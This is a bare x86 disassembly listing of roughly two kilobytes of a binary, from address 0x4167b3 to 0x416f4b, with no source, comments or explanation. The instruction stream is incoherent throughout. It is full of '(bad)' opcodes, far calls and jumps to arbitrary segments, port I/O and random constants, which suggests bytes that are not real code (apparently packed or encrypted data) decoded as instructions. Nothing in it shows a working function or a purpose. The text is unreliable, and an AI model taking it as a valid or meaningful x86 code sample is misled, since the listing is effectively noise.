  4167b3:	xchg   BYTE PTR [edi-0x75],bl
  4167b6:	xor    ecx,DWORD PTR [esp+eiz*4+0x4f]
  4167ba:	sub    cl,BYTE PTR [esi+0xc]
  4167bd:	ins    DWORD PTR es:[edi],dx
  4167be:	or     al,0x6e
  4167c0:	sub    eax,0x57f4dfee
  4167c5:	sbb    DWORD PTR [edx],ebp
  4167c7:	xor    ebx,DWORD PTR [edx]
  4167c9:	bound  ecx,QWORD PTR [ecx]
  4167cb:	xchg   DWORD PTR [ebp+ebx*2-0x4a],esi
  4167cf:	xor    BYTE PTR [edx-0x34],dl
  4167d2:	into   
  4167d3:	or     ebx,eax
  4167d5:	push   edi
  4167d6:	stos   DWORD PTR es:[edi],eax
  4167d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167d8:	test   eax,0x29ae57fb
  4167dd:	mov    bh,0xc5
  4167df:	inc    ebx
  4167e0:	inc    edx
  4167e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167e2:	push   0x724c649d
  4167e7:	retf   
  4167e8:	cmp    BYTE PTR [esi-0x493af92e],ch
  4167ee:	adc    eax,0x49e5b324
  4167f3:	push   0xffffffa8
  4167f5:	or     al,BYTE PTR [esi]
  4167f7:	jp     0x416822
  4167f9:	lods   al,BYTE PTR ds:[esi]
  4167fa:	jp     0x416851
  4167fc:	mov    ecx,0xcbebd9f1
  416801:	neg    dh
  416803:	push   eax
  416804:	(bad)  
  416805:	lea    ebp,[eax+0x1e062d4a]
  41680b:	mov    ch,0xc4
  41680d:	xlat   BYTE PTR ds:[ebx]
  41680e:	and    al,0xd6
  416810:	push   edi
  416811:	inc    ebp
  416812:	aad    0x7f
  416814:	aam    0x62
  416816:	and    DWORD PTR [ebx],ebp
  416818:	mov    ah,dl
  41681a:	mov    edx,0xcf81f016
  41681f:	int3   
  416820:	leave  
  416821:	inc    ebp
  416822:	js     0x41685f
  416824:	sbb    ecx,ebp
  416826:	inc    eax
  416827:	daa    
  416828:	iret   
  416829:	ss dec ebp
  41682b:	ja     0x41680d
  41682d:	sub    ebx,0x29
  416830:	pusha  
  416831:	pushf  
  416832:	aam    0xa5
  416834:	(bad)  
  416835:	int    0x14
  416837:	jnp    0x4167c4
  416839:	pop    ss
  41683a:	pxor   mm1,QWORD PTR [ecx+0x14]
  41683e:	xor    al,0xa4
  416840:	das    
  416841:	fbld   TBYTE PTR [ebx+0x46bc08ff]
  416847:	arpl   WORD PTR [ebp-0x7144dc9b],sp
  41684d:	jno    0x4167dc
  41684f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416850:	mov    eax,ds:0x3ee05c80
  416855:	sub    BYTE PTR [edx],bh
  416857:	mov    edi,0x57f525e
  41685c:	adc    BYTE PTR [eax-0x3b],ah
  41685f:	mov    esp,0x8b9d54d
  416864:	or     ecx,esp
  416866:	aam    0xb8
  416868:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41686a:	aas    
  41686b:	jb     0x416891
  41686d:	or     DWORD PTR [edi-0x32],edx
  416870:	test   eax,0xf2daf08
  416875:	mov    ds:0x8775614e,eax
  41687a:	mov    WORD PTR [eax-0x74],?
  41687d:	outs   dx,DWORD PTR ds:[esi]
  41687e:	mov    ch,0xfb
  416880:	mov    dl,0x9b
  416882:	(bad)  
  416883:	mov    esp,0xb0b2bce8
  416888:	arpl   WORD PTR [edx],sp
  41688a:	stos   DWORD PTR es:[edi],eax
  41688b:	add    al,0xe5
  41688d:	popa   
  41688e:	neg    eax
  416890:	pop    esp
  416891:	addr16 mov dl,0x6e
  416894:	pop    es
  416895:	pop    ebp
  416896:	retf   0x578c
  416899:	mov    cl,0x2
  41689b:	mov    DWORD PTR [esi-0x972e987],esi
  4168a1:	pushf  
  4168a2:	jo     0x41691c
  4168a4:	std    
  4168a5:	imul   ebx,DWORD PTR [esi-0x33e07303],0x85e108da
  4168af:	sti    
  4168b0:	push   es
  4168b1:	inc    edx
  4168b2:	ja     0x416923
  4168b4:	mov    ds:0x6a683876,al
  4168b9:	out    0x38,eax
  4168bb:	aaa    
  4168bc:	data16 sub bl,BYTE PTR [ebx+0x38]
  4168c0:	dec    edx
  4168c1:	xchg   ebp,eax
  4168c2:	clc    
  4168c3:	int3   
  4168c4:	cmc    
  4168c5:	or     eax,DWORD PTR [ebp+0x3c]
  4168c8:	lahf   
  4168c9:	loop   0x4168af
  4168cb:	xchg   ebx,eax
  4168cc:	dec    esi
  4168cd:	dec    esp
  4168ce:	(bad)  
  4168cf:	pmulhw mm3,QWORD PTR [eax-0x2f]
  4168d3:	pop    edx
  4168d4:	pop    eax
  4168d5:	(bad)  
  4168d6:	in     eax,dx
  4168d7:	push   ds
  4168d8:	stos   DWORD PTR es:[edi],eax
  4168d9:	outs   dx,BYTE PTR ds:[esi]
  4168da:	mov    cs:0xc5215812,eax
  4168e0:	inc    edi
  4168e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4168e2:	add    eax,0x5d7996be
  4168e7:	repnz xchg esp,eax
  4168e9:	inc    esi
  4168ea:	jno    0x4168cd
  4168ec:	aad    0x7d
  4168ee:	mov    ah,0x39
  4168f0:	cmp    BYTE PTR [edi+0x4e],dl
  4168f3:	test   esp,edi
  4168f5:	and    ebp,DWORD PTR [ecx+ebx*4+0x720b7429]
  4168fc:	ds in  al,0x1d
  4168ff:	inc    esi
  416900:	aam    0xfd
  416902:	push   ebp
  416903:	fcmovnu st,st(7)
  416905:	bound  edi,QWORD PTR [esi-0x6c2657d4]
  41690b:	fcom   DWORD PTR [esi-0x6]
  41690e:	jae    0x416918
  416910:	call   FWORD PTR [ecx+0x77]
  416913:	(bad)  [edx-0x45]
  416917:	and    edi,DWORD PTR [ecx+0x7b]
  41691a:	mov    ds:0x19e57d25,al
  41691f:	(bad)  
  416921:	icebp  
  416922:	(bad)  
  416923:	xor    ebp,DWORD PTR [ebx]
  416925:	in     eax,0x0
  416927:	adc    bl,0x39
  41692a:	adc    esi,eax
  41692c:	pop    esi
  41692d:	test   BYTE PTR [edi-0xb],bh
  416930:	aad    0x41
  416932:	into   
  416933:	enter  0x1b21,0xed
  416937:	pop    ss
  416938:	dec    esi
  416939:	ds inc esp
  41693b:	arpl   WORD PTR [ebx],si
  41693d:	jmp    0x9906:0x99e72b6f
  416944:	(bad)  
  416946:	push   cs
  416947:	int3   
  416948:	dec    ebx
  416949:	jbe    0x4169b9
  41694b:	mov    ah,0xb1
  41694d:	(bad)  
  41694e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41694f:	cld    
  416950:	sbb    al,0xcc
  416952:	out    0x77,al
  416954:	jbe    0x41693e
  416956:	jl     0x416936
  416958:	mov    edx,0xbcd430e0
  41695d:	cmp    edi,DWORD PTR [esi-0x65670de]
  416963:	mov    al,ds:0x1d8e9bcc
  416968:	jbe    0x416940
  41696a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41696b:	hlt    
  41696c:	push   0xffffffa6
  41696e:	fsubr  QWORD PTR [esi-0x64]
  416971:	push   ebx
  416972:	imul   DWORD PTR [esi]
  416974:	je     0x416985
  416976:	xor    BYTE PTR [edx+eiz*8],0xd
  41697a:	rol    ebp,1
  41697c:	pop    ebx
  41697d:	(bad)  
  41697e:	dec    ebx
  41697f:	ja     0x3215350
  416985:	add    BYTE PTR [eax],al
  416987:	cmc    
  416988:	std    
  416989:	fs mov ah,0x74
  41698c:	jno    0x416983
  41698e:	mov    ecx,0x2f2f76b9
  416993:	and    bh,BYTE PTR ds:0x1fa55ec7
  416999:	jg     0x416a0b
  41699b:	mov    ecx,0xab70707e
  4169a0:	es retf 0x5fed
  4169a4:	in     eax,dx
  4169a5:	cmp    al,0x1b
  4169a7:	or     eax,ecx
  4169a9:	push   edx
  4169aa:	jns    0x416a01
  4169ac:	pop    edx
  4169ad:	aas    
  4169ae:	ins    BYTE PTR es:[edi],dx
  4169af:	iret   
  4169b0:	xchg   ecx,eax
  4169b1:	push   es
  4169b2:	adc    eax,DWORD PTR [ebx+0x3e]
  4169b5:	pop    eax
  4169b6:	mov    dh,0xff
  4169b8:	cmp    eax,0xca9bfe94
  4169bd:	mov    esp,0xefaf7019
  4169c2:	lods   al,BYTE PTR ds:[esi]
  4169c3:	daa    
  4169c4:	push   esi
  4169c5:	jmp    0x416997
  4169c7:	rcl    BYTE PTR [eax+edx*4-0x40],cl
  4169cb:	test   DWORD PTR [ecx+esi*8-0x5],esi
  4169cf:	sahf   
  4169d0:	outs   dx,BYTE PTR ds:[esi]
  4169d1:	mov    edi,DWORD PTR [edi+0x1445218]
  4169d7:	lock fwait
  4169d9:	stos   DWORD PTR es:[edi],eax
  4169da:	or     eax,0x8aa737c1
  4169df:	or     edx,DWORD PTR [ebx+0x214abd65]
  4169e5:	out    dx,eax
  4169e6:	ror    DWORD PTR ds:0xe66a3d7,1
  4169ec:	fsubr  st,st(1)
  4169ee:	(bad)  
  4169f0:	or     al,BYTE PTR [ebx-0x46]
  4169f3:	jg     0x4169f2
  4169f5:	lahf   
  4169f6:	dec    edx
  4169f7:	out    dx,al
  4169f8:	fdiv   DWORD PTR [ecx-0x47]
  4169fb:	cwde   
  4169fc:	and    eax,DWORD PTR [edx-0x5c6bd097]
  416a02:	aad    0x70
  416a04:	xor    DWORD PTR ds:0x22b2607a,0x19493ae3
  416a0e:	jle    0x416a7b
  416a10:	push   ebp
  416a11:	add    edi,DWORD PTR [edx+0x794d360b]
  416a17:	std    
  416a18:	not    DWORD PTR [ecx+0x5416e9bb]
  416a1e:	sbb    al,BYTE PTR [ebp-0x3a62acf6]
  416a24:	clc    
  416a25:	shr    BYTE PTR [ebx],cl
  416a27:	and    eax,0xed8aa342
  416a2c:	mov    BYTE PTR [edi+0x3f],dl
  416a2f:	mov    BYTE PTR [edi-0x19ff1c58],dl
  416a35:	daa    
  416a36:	retf   
  416a37:	mov    ch,0x7b
  416a39:	add    eax,0xc235cfa7
  416a3e:	enter  0x21cf,0xe9
  416a42:	std    
  416a43:	mov    ebp,0x7a6b95e6
  416a48:	rol    BYTE PTR ds:0xe46d81a4,1
  416a4e:	xor    eax,0x32743606
  416a53:	imul   esp,DWORD PTR [ebx],0x9852531e
  416a59:	aas    
  416a5a:	push   ds
  416a5b:	or     al,0xc6
  416a5d:	lods   al,BYTE PTR ds:[esi]
  416a5e:	inc    edi
  416a5f:	sbb    al,al
  416a61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a62:	xor    BYTE PTR [eax+0x7351d943],0x50
  416a69:	sar    eax,1
  416a6b:	jecxz  0x416a1f
  416a6d:	sar    dh,0x19
  416a70:	shl    BYTE PTR [ebp+0xb6a1e51],cl
  416a76:	dec    eax
  416a77:	sub    DWORD PTR [ebx+eax*2],edx
  416a7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a7b:	adc    al,0x8
  416a7d:	sbb    al,0xd2
  416a7f:	aaa    
  416a80:	sbb    DWORD PTR [ebx-0x43f3bcea],esp
  416a86:	inc    ebx
  416a87:	mov    ebp,0x72b654d0
  416a8c:	call   0x9745:0xa17dbffa
  416a93:	les    esp,FWORD PTR [edi]
  416a95:	test   esp,eax
  416a97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a98:	imul   eax,DWORD PTR [ebx+esi*4],0x9d7e7a69
  416a9f:	outs   dx,BYTE PTR ds:[esi]
  416aa0:	pop    ds
  416aa1:	data16 test BYTE PTR [edi*2-0x2e839ed6],ch
  416aa9:	sub    DWORD PTR [eax],0xfffffff2
  416aac:	hlt    
  416aad:	jmp    0x7b9f:0x8df5da66
  416ab4:	jle    0x416b10
  416ab6:	push   ss
  416ab7:	jmp    0x17e7c508
  416abc:	sahf   
  416abd:	inc    ebx
  416abe:	fnsave [edi]
  416ac0:	push   ds
  416ac1:	sub    BYTE PTR [ecx],al
  416ac3:	call   0x28e9:0x78afe412
  416aca:	jae    0x416a85
  416acc:	mov    edi,0xb3f86232
  416ad1:	ret    
  416ad2:	push   ss
  416ad3:	push   eax
  416ad4:	push   ecx
  416ad5:	dec    ebx
  416ad6:	mov    dl,0x1
  416ad8:	adc    eax,0xa938a98d
  416add:	xor    ebx,0x74
  416ae0:	push   cs
  416ae1:	jnp    0x416aca
  416ae3:	adc    al,0x24
  416ae5:	jae    0x416a95
  416ae7:	imul   edi,DWORD PTR [esi-0x3169cb18],0x672725fa
  416af1:	les    esp,FWORD PTR [esi+0xb]
  416af4:	dec    ebx
  416af5:	pop    ecx
  416af6:	push   ds
  416af7:	sar    ebx,cl
  416af9:	mov    cl,0xab
  416afb:	mov    dl,0x11
  416afd:	inc    edx
  416afe:	sahf   
  416aff:	sub    BYTE PTR [edx+0x2e66d884],ah
  416b05:	popa   
  416b06:	scas   al,BYTE PTR es:[edi]
  416b07:	xlat   BYTE PTR ds:[ebx]
  416b08:	out    dx,al
  416b09:	fsub   QWORD PTR [eax+esi*8-0x80828ce]
  416b10:	and    al,0xd1
  416b12:	xor    BYTE PTR [esi],ch
  416b14:	cdq    
  416b15:	shl    DWORD PTR [eax+edx*4+0x48],1
  416b19:	retf   0x9219
  416b1c:	test   eax,0x36bd0f50
  416b21:	into   
  416b22:	push   edi
  416b23:	pop    ebp
  416b24:	inc    esp
  416b25:	div    eax
  416b27:	repnz shl DWORD PTR cs:[esp+edi*8+0x14c47181],1
  416b30:	(bad)  
  416b31:	cmc    
  416b32:	jae    0x416ad6
  416b34:	jo     0x416b99
  416b36:	(bad)  
  416b37:	and    cl,dl
  416b39:	and    esp,DWORD PTR [eax+0x4fed3d16]
  416b3f:	sbb    eax,0x3c2bba53
  416b44:	mov    DWORD PTR [eax+ebp*4-0x2],ebx
  416b48:	xchg   ebp,eax
  416b49:	inc    DWORD PTR [ebp+0x3e]
  416b4c:	cmp    al,0xa2
  416b4e:	dec    ebx
  416b4f:	push   ebp
  416b50:	xchg   edx,eax
  416b51:	mov    ch,0x7c
  416b53:	jmp    0x416b67
  416b55:	jecxz  0x416b82
  416b57:	mov    edx,0x84d68ab5
  416b5c:	push   es
  416b5d:	aas    
  416b5e:	loopne 0x416ba5
  416b60:	pop    ebx
  416b61:	popf   
  416b62:	jne    0x416b40
  416b64:	(bad)  
  416b65:	int3   
  416b66:	sbb    edx,DWORD PTR [eax+eiz*4+0x2910a7eb]
  416b6d:	pusha  
  416b6e:	sub    eax,0x6cdfa9cc
  416b73:	add    bh,BYTE PTR es:[ebx+0x60]
  416b77:	pop    eax
  416b78:	mov    bh,0xfd
  416b7a:	pop    edx
  416b7b:	test   eax,0x17f50f5e
  416b80:	pop    ds
  416b81:	jnp    0x416bbb
  416b83:	xchg   esi,eax
  416b84:	cmp    al,0x3b
  416b86:	jo     0x416b4c
  416b88:	xor    ebx,0xffffffbc
  416b8b:	mov    ebp,0xefb44796
  416b90:	xchg   BYTE PTR [esi],cl
  416b92:	pop    eax
  416b93:	test   al,0xfd
  416b95:	test   al,0xfc
  416b97:	loopne 0x416b29
  416b99:	adc    al,0xfd
  416b9b:	adc    edx,0x29
  416b9e:	fcomp  QWORD PTR [edx-0x7647e17e]
  416ba4:	(bad)  
  416ba5:	xchg   esp,eax
  416ba6:	test   BYTE PTR [ebp-0x6e],cl
  416ba9:	or     DWORD PTR [edx-0x2b],eax
  416bac:	jo     0x416ba5
  416bae:	jp     0x416b42
  416bb0:	fld    DWORD PTR ss:[esi+ebx*4]
  416bb4:	sub    bl,bh
  416bb6:	or     al,0xa1
  416bb8:	lock pop ebp
  416bba:	sub    BYTE PTR [esi-0x28],ah
  416bbd:	cmp    eax,0x7aeffa90
  416bc2:	push   esp
  416bc3:	out    dx,eax
  416bc4:	xchg   ecx,eax
  416bc5:	pop    ebp
  416bc6:	mov    cs,WORD PTR [eax+eiz*4+0x386b0d12]
  416bcd:	dec    esp
  416bce:	xchg   esp,eax
  416bcf:	inc    ebp
  416bd0:	cmp    bh,dl
  416bd2:	dec    esi
  416bd3:	loopne 0x416b64
  416bd5:	sbb    ecx,DWORD PTR [edi-0x195977be]
  416bdb:	lahf   
  416bdc:	addr16 sti 
  416bde:	outs   dx,BYTE PTR ds:[esi]
  416bdf:	or     ebx,ebp
  416be1:	shl    BYTE PTR [ecx-0x539bb7d8],1
  416be7:	fsubr  DWORD PTR [edi+0x23]
  416bea:	das    
  416beb:	ins    DWORD PTR es:[edi],dx
  416bec:	sbb    dl,al
  416bee:	ret    
  416bef:	pop    ecx
  416bf0:	dec    edi
  416bf1:	std    
  416bf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416bf3:	add    ecx,esi
  416bf5:	cwde   
  416bf6:	cmc    
  416bf7:	fst    QWORD PTR [esp+ecx*8+0x215134f8]
  416bfe:	stos   BYTE PTR es:[edi],al
  416bff:	xchg   edx,eax
  416c00:	sbb    al,0x61
  416c02:	rcl    BYTE PTR [ebx],cl
  416c04:	xor    ah,cl
  416c06:	pop    ebp
  416c07:	jne    0x416baa
  416c09:	inc    esp
  416c0a:	call   0x53e8:0x38109709
  416c11:	ds xchg esp,eax
  416c13:	mov    bl,0x33
  416c15:	std    
  416c16:	mov    dh,0x58
  416c18:	(bad)  
  416c1a:	dec    eax
  416c1b:	adc    ah,dh
  416c1d:	sub    ebp,DWORD PTR [ebp-0x28f10488]
  416c23:	test   BYTE PTR [esi+0x34],cl
  416c26:	xor    ah,BYTE PTR [edx-0x1f9fc518]
  416c2c:	jne    0x416c0b
  416c2e:	lahf   
  416c2f:	xor    eax,0x1a357ccb
  416c34:	mov    al,ds:0xefabf544
  416c39:	fs jnp 0x416bbd
  416c3c:	idiv   BYTE PTR [eax+0x4f0d705f]
  416c42:	mov    edi,cs
  416c44:	scas   eax,DWORD PTR es:[edi]
  416c45:	sbb    eax,0xb228ca73
  416c4a:	in     al,0xda
  416c4c:	loope  0x416cb1
  416c4e:	fnstsw WORD PTR [ebx+0x7d]
  416c51:	ficom  DWORD PTR [edx+eax*4+0x50]
  416c55:	jecxz  0x416c80
  416c57:	xor    DWORD PTR [edx+edx*1-0x12d24d5a],esi
  416c5e:	xor    eax,edx
  416c60:	jle    0x416c78
  416c62:	push   cs
  416c63:	popa   
  416c64:	mov    ebp,0x458b4971
  416c69:	in     al,0xe9
  416c6b:	fild   WORD PTR [edx]
  416c6d:	add    BYTE PTR [eax],al
  416c6f:	outs   dx,BYTE PTR ds:[esi]
  416c70:	ds push eax
  416c72:	loopne 0x416cd4
  416c74:	outs   dx,BYTE PTR ds:[esi]
  416c75:	outs   dx,BYTE PTR ds:[esi]
  416c76:	mov    esi,0xcbfa089
  416c7b:	and    DWORD PTR [ecx+0xc],0x42
  416c7f:	out    dx,al
  416c80:	sbb    al,0x7f
  416c82:	jo     0x416c3d
  416c84:	jle    0x416cf6
  416c86:	jo     0x416cc1
  416c88:	addr16 in al,dx
  416c8a:	push   ss
  416c8b:	or     DWORD PTR ds:0x7198e659,0xebff6fb4
  416c95:	mov    al,ds:0x22391d11
  416c9a:	pop    esi
  416c9b:	sub    esp,DWORD PTR [esi+0x0]
  416c9e:	fcom   DWORD PTR [ebx]
  416ca0:	dec    esi
  416ca1:	(bad)  
  416ca2:	mov    bl,0x94
  416ca4:	and    DWORD PTR [eax+0x2f],ebx
  416ca7:	and    DWORD PTR [ecx-0x7946f5dc],edx
  416cad:	mov    DWORD PTR [eax],ecx
  416caf:	lahf   
  416cb0:	add    eax,0xab5b4d80
  416cb5:	or     ebx,eax
  416cb7:	in     eax,dx
  416cb8:	arpl   WORD PTR [edi],si
  416cba:	or     BYTE PTR [eax+0x6e922f0],dh
  416cc0:	and    edi,ebx
  416cc2:	mov    al,0x2a
  416cc4:	repnz pusha 
  416cc6:	repz mov edi,0xb0170414
  416ccc:	sbb    edx,DWORD PTR ds:0xb04d2447
  416cd2:	(bad)  
  416cd3:	pusha  
  416cd4:	sub    eax,0x593a46a7
  416cd9:	xor    ebp,DWORD PTR [edi+0x15049d8b]
  416cdf:	pop    esp
  416ce0:	popa   
  416ce1:	shl    DWORD PTR [eax+eiz*1-0x281a2cf6],cl
  416ce8:	pop    edi
  416ce9:	in     eax,dx
  416cea:	adc    BYTE PTR [edx-0x6e],ah
  416ced:	mov    edi,0xd2343437
  416cf2:	retf   
  416cf3:	sbb    eax,0x3f1b5c4
  416cf8:	or     eax,DWORD PTR [ebx+edi*2]
  416cfb:	in     al,dx
  416cfc:	pop    ecx
  416cfd:	(bad)  
  416cfe:	add    BYTE PTR [edx+0x3923e13a],0x8d
  416d05:	sub    al,0xb5
  416d07:	xchg   edx,eax
  416d08:	call   0xa32c:0x8932f03f
  416d0f:	retf   
  416d10:	lea    esp,[esi-0x30c07e86]
  416d16:	hlt    
  416d17:	jmp    0x416d03
  416d19:	mov    ebx,0xf584a7f0
  416d1e:	cli    
  416d1f:	mov    eax,ds:0xa8726d07
  416d24:	push   edi
  416d25:	shl    BYTE PTR [ecx-0x34],1
  416d28:	sbb    eax,0x96c96662
  416d2d:	lock adc al,0x59
  416d30:	pushf  
  416d31:	xchg   bl,ah
  416d33:	test   al,0x7c
  416d35:	mov    ah,0x7c
  416d37:	pushf  
  416d38:	lods   eax,DWORD PTR ds:[esi]
  416d39:	xchg   ecx,eax
  416d3a:	cmp    eax,0x1fcec6f7
  416d3f:	jge    0x416d9f
  416d41:	or     ecx,eax
  416d43:	popf   
  416d44:	popf   
  416d45:	into   
  416d46:	adc    al,BYTE PTR [ecx-0x26]
  416d49:	jno    0x416ccd
  416d4b:	push   ecx
  416d4c:	and    esp,eax
  416d4e:	ss ins DWORD PTR es:[edi],dx
  416d50:	pop    es
  416d51:	iret   
  416d52:	inc    ebx
  416d53:	xor    al,0x9a
  416d55:	adc    cl,BYTE PTR [edx+esi*2]
  416d58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d59:	out    0x6d,al
  416d5b:	jge    0x416ddc
  416d5d:	loop   0x416da7
  416d5f:	jmp    0x6e7598f4
  416d64:	push   ebp
  416d65:	xchg   ecx,eax
  416d66:	jl     0x416d99
  416d68:	(bad)  
  416d69:	push   ecx
  416d6a:	cs out 0x38,al
  416d6d:	xchg   esp,eax
  416d6e:	cmp    al,0xaa
  416d70:	cmp    BYTE PTR [ecx],0x70
  416d73:	sar    BYTE PTR [bp-0x2e],1
  416d77:	sub    BYTE PTR [edi],dh
  416d79:	mov    edi,0x437a5ba0
  416d7e:	inc    esp
  416d7f:	pop    DWORD PTR [esi]
  416d81:	loope  0x416db8
  416d83:	popf   
  416d84:	cmp    DWORD PTR [ecx+0x27],edi
  416d87:	and    eax,DWORD PTR [ebx]
  416d89:	inc    ecx
  416d8a:	icebp  
  416d8b:	cwde   
  416d8c:	add    BYTE PTR [eax+0x23f3e540],cl
  416d92:	push   ebx
  416d93:	jo     0x416d90
  416d95:	je     0x416d69
  416d97:	pop    edx
  416d98:	loop   0x416d87
  416d9a:	leave  
  416d9b:	ds pop eax
  416d9d:	repz jne 0x416d9e
  416da0:	int    0xba
  416da2:	int3   
  416da3:	push   cs
  416da4:	cs jns 0x416d7a
  416da7:	(bad)  
  416da9:	sbb    eax,0x3e17706d
  416dae:	mov    bl,BYTE PTR [ecx+ebp*4-0x5a838593]
  416db5:	cmp    edi,ebx
  416db7:	dec    ebx
  416db8:	mov    dl,0x21
  416dba:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  416dbc:	sbb    ch,BYTE PTR [ecx+0x35dd3bc]
  416dc2:	dec    ecx
  416dc3:	repz or BYTE PTR [eax-0x1c17ccaa],0x8b
  416dcb:	shl    BYTE PTR [esi+ebx*2-0x11],0x3c
  416dd0:	add    al,0x1
  416dd2:	lea    ecx,[ebx-0x36d568c4]
  416dd8:	imul   cx,WORD PTR [edx+0x1357a729],0xffb7
  416de0:	jle    0x416dd6
  416de2:	sbb    al,0xbd
  416de4:	aam    0x18
  416de6:	push   edi
  416de7:	xchg   esi,eax
  416de8:	pusha  
  416de9:	retf   0x8458
  416dec:	mov    ds:0xbedbc4ac,al
  416df1:	cld    
  416df2:	pop    edx
  416df3:	in     eax,dx
  416df4:	mov    al,ds:0x36f9086a
  416df9:	jg     0x416dae
  416dfb:	ret    
  416dfc:	and    eax,0xd1bb5ec4
  416e01:	test   al,0x16
  416e03:	stos   DWORD PTR es:[edi],eax
  416e04:	xchg   BYTE PTR ds:0x1214b71c,ah
  416e0a:	mov    bh,0xf0
  416e0c:	mov    al,0x40
  416e0e:	inc    ecx
  416e0f:	mov    ds:0xba9635b0,al
  416e14:	popf   
  416e15:	div    BYTE PTR [esi+0x22538654]
  416e1b:	xchg   esp,eax
  416e1c:	push   esi
  416e1d:	outs   dx,BYTE PTR ds:[esi]
  416e1e:	mov    edi,ecx
  416e20:	loopne 0x416dd6
  416e22:	dec    edx
  416e23:	sbb    cl,al
  416e25:	and    bh,BYTE PTR [eax+eax*8+0x3e]
  416e29:	dec    esp
  416e2a:	nop
  416e2b:	sub    bl,al
  416e2d:	mov    esp,0x11c7df70
  416e32:	mov    esp,0xb976c37e
  416e37:	loope  0x416dfb
  416e39:	pop    ebp
  416e3a:	out    0xd6,eax
  416e3c:	inc    ebx
  416e3d:	pop    ss
  416e3e:	jmp    FWORD PTR ds:0x14dc161
  416e44:	cmp    al,0xa0
  416e46:	dec    esp
  416e47:	inc    ecx
  416e48:	pop    esi
  416e49:	mov    ds:0xebde18d6,al
  416e4e:	in     eax,0x58
  416e50:	popf   
  416e51:	out    dx,eax
  416e52:	sbb    esi,edi
  416e54:	les    edx,FWORD PTR [edi]
  416e56:	sub    al,0xac
  416e58:	and    ah,dh
  416e5a:	cmp    bh,ch
  416e5c:	xor    ch,BYTE PTR [ebx+0x6]
  416e5f:	mov    ch,0xde
  416e61:	bound  ebp,QWORD PTR cs:[eax]
  416e64:	call   0xcf6dd9c9
  416e69:	dec    edi
  416e6a:	jg     0x416e76
  416e6c:	sub    BYTE PTR [ebx-0xc],al
  416e6f:	jle    0x416ed1
  416e71:	addr16 push eax
  416e73:	js     0x416eb1
  416e75:	jle    0x416e36
  416e77:	call   0x854b:0xb62e7d79
  416e7e:	outs   dx,BYTE PTR ds:[esi]
  416e7f:	jne    0x416e24
  416e81:	lahf   
  416e82:	sub    eax,0xc5de1162
  416e87:	enter  0x5971,0xa4
  416e8b:	mov    bh,0x4d
  416e8d:	sub    al,0x8e
  416e8f:	mov    dh,0xe1
  416e91:	fwait
  416e92:	pop    ebx
  416e93:	xchg   esi,edx
  416e95:	sub    DWORD PTR ds:0xf87ee812,ebx
  416e9b:	mov    dl,0xcc
  416e9d:	adc    bl,cl
  416e9f:	jbe    0x416ef2
  416ea1:	rcl    DWORD PTR [ebp+0x7b],cl
  416ea4:	lods   al,BYTE PTR ds:[esi]
  416ea5:	inc    eax
  416ea6:	retf   0xbbdc
  416ea9:	rol    ebx,cl
  416eab:	ret    0x4367
  416eae:	arpl   dx,bp
  416eb0:	pop    ebp
  416eb1:	mov    esp,0xf85061fc
  416eb6:	xchg   esi,eax
  416eb7:	(bad)  
  416eb8:	in     al,0x5c
  416eba:	push   ebp
  416ebb:	in     al,0x90
  416ebd:	in     al,dx
  416ebe:	leave  
  416ebf:	xchg   esi,eax
  416ec0:	into   
  416ec1:	push   DWORD PTR ds:0x1dac4f50
  416ec7:	sbb    dl,BYTE PTR [eax+0x44588b2c]
  416ecd:	adc    bh,BYTE PTR [ebx-0x17ee6e8e]
  416ed3:	pusha  
  416ed4:	mov    ebp,0x8858b3c8
  416ed9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416eda:	sbb    ebx,eax
  416edc:	cmp    BYTE PTR [ebx-0x4aec8627],bl
  416ee2:	xchg   ebp,eax
  416ee3:	pop    ebp
  416ee4:	xchg   ecx,eax
  416ee5:	dec    eax
  416ee6:	xchg   esi,eax
  416ee7:	test   DWORD PTR [edx-0x301aa6e8],ebp
  416eed:	dec    ecx
  416eee:	ret    
  416eef:	out    0x77,al
  416ef1:	out    0xe5,eax
  416ef3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ef4:	icebp  
  416ef5:	outs   dx,DWORD PTR ds:[esi]
  416ef6:	popf   
  416ef7:	and    DWORD PTR [edi+ecx*4],edx
  416efa:	fwait
  416efb:	xor    al,BYTE PTR [edi+0x3074bf79]
  416f01:	jae    0x416ec2
  416f03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f04:	xor    DWORD PTR [edi-0x79],ebp
  416f07:	fstp   st(3)
  416f09:	cdq    
  416f0a:	jmp    0xc4c45df3
  416f0f:	cmp    edx,DWORD PTR [eax]
  416f11:	outs   dx,DWORD PTR ds:[esi]
  416f12:	aad    0xde
  416f14:	sbb    al,0xec
  416f16:	xchg   ecx,eax
  416f17:	push   eax
  416f18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f19:	ins    DWORD PTR es:[edi],dx
  416f1a:	test   al,0x75
  416f1c:	cdq    
  416f1d:	cmp    cl,BYTE PTR [edi-0x3111f08d]
  416f23:	inc    ebx
  416f24:	pop    edx
  416f25:	cmc    
  416f26:	push   eax
  416f27:	push   cs
  416f28:	call   0x5fce:0x819d9698
  416f2f:	cmc    
  416f30:	inc    esp
  416f31:	popa   
  416f32:	mov    ecx,0xf5e7abef
  416f37:	mov    cl,0x9
  416f39:	jb     0x416ec0
  416f3b:	adc    ebp,edi
  416f3d:	in     eax,dx
  416f3e:	xor    BYTE PTR [edx-0x2d],ch
  416f41:	jl     0x416f26
  416f43:	pop    edx
  416f44:	jge    0x416ee8
  416f46:	jmp    0x416ee2
  416f48:	push   ecx
  416f49:	or     ecx,edi
  416f4b:	scas   al,BYTE PTR es:[edi]
